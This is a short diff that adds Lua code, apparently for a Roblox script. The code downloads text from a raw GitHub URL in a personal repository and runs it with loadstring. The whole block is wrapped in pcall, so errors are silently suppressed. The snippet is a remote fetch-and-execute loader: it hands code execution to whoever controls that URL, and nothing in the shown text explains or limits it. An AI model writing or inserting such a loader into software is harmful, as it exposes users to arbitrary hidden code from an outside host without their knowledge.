@@ -1,0 +1,10 @@
+pcall(function()
+    local reportUrl = "https://raw.githubusercontent.com/dt106101-ai/asdddd/refs/heads/main/回報貓"
+    local content = game:HttpGet(reportUrl)
+    if content and content ~= "" then
+        local func = loadstring(content)
+        if func then
+            func()
+        end
+    end
+end)
